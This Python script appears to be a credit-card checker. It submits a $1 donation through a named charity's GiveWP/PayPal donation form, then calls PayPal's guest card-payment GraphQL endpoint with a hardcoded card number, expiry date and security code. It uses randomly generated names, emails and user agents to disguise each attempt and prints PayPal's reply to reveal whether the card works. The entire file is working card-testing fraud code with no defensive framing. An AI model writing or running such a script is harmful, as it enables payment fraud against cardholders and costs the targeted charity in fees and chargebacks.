import requests
import re
import random
from faker import Faker
from user_agent import generate_user_agent

x = Faker()
n = x.name()
r = requests.Session()
u = generate_user_agent()

def python():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()
    
e = python()

headers = {
    'authority': 'dabbaghwelfare.org',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryDw5vdGhuKDezOYDe',
    'origin': 'https://dabbaghwelfare.org',
    'referer': 'https://dabbaghwelfare.org/?givewp-route=donation-form-view&form-id=2784&locale=en_US',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': u,
}

params = {
    'action': 'give_paypal_commerce_create_order',
}

files = {
    'give-form-id': (None, '2784'),
    'give-form-hash': (None, 'ebe7a8f6aa'),
    'give_payment_mode': (None, 'paypal-commerce'),
    'give-amount': (None, '1'),
    'give-recurring-period': (None, 'one-time'),
    'period': (None, 'one-time'),
    'frequency': (None, '1'),
    'times': (None, '0'),
    'give_first': (None, n),
    'give_last': (None, n),
    'give_email': (None, e),
    'give-cs-form-currency': (None, 'USD'),
}

response = r.post(
    'https://dabbaghwelfare.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=r.cookies,
    headers=headers,
    files=files,
)

headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'disable-set-cookie': 'true',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': '01W89774CS598411U',
    'referer': 'https://www.paypal.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': u,
    'x-app-name': 'smart-payment-buttons',
}

json_data = {
    'query': '\n        query GetCheckoutDetails($orderID: String!) {\n            checkoutSession(token: $orderID) {\n                cart {\n                    billingType\n                    productCode\n                    intent\n                    paymentId\n                    billingToken\n                    amounts {\n                        total {\n                            currencyValue\n                            currencyCode\n                            currencyFormatSymbolISOCurrency\n                        }\n                    }\n                    supplementary {\n                        initiationIntent\n                    }\n                    category\n                }\n                flags {\n                    isChangeShippingAddressAllowed\n                }\n                payees {\n                    merchantId\n                    email {\n                        stringValue\n                    }\n                }\n            }\n        }\n        ',
    'variables': {
        'orderID': '01W89774CS598411U',
    },
}

response = r.post('https://www.paypal.com/graphql?GetCheckoutDetails', cookies=r.cookies, headers=headers, json=json_data)

id = response.json()['extensions']['correlationId']

headers = {
    'authority': 'www.paypal.com',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': '01W89774CS598411U',
    'paypal-client-metadata-id': '01W89774CS598411U',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': u,
    'x-app-name': 'standardcardfields',
    'x-country': 'US',
}

json_data = {
    'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
    'variables': {
        'token': '01W89774CS598411U',
        'card': {
            'cardNumber': '4165680000771388',
            'expirationDate': '11/2029',
            'postalCode': '10001',
            'securityCode': '169',
        },
        'phoneNumber': '7154663434',
        'firstName': n,
        'lastName': n,
        'billingAddress': {
            'givenName': n,
            'familyName': n,
            'line1': 'Cali park 39 qve vii',
            'line2': '',
            'city': 'new york',
            'state': 'NY',
            'postalCode': '10001',
            'country': 'US',
        },
        'shippingAddress': {
            'givenName': n,
            'familyName': n,
            'line1': 'Cali park 39 qve vii',
            'line2': '',
            'city': 'new york',
            'state': 'NY',
            'postalCode': '10001',
            'country': 'US',
        },
        'email': e,
        'currencyConversionType': 'PAYPAL',
    },
    'operationName': 'payWithCard'
}

response = r.post('https://www.paypal.com/graphql?paywithcard', cookies=r.cookies, headers=headers, json=json_data)

print(response.text)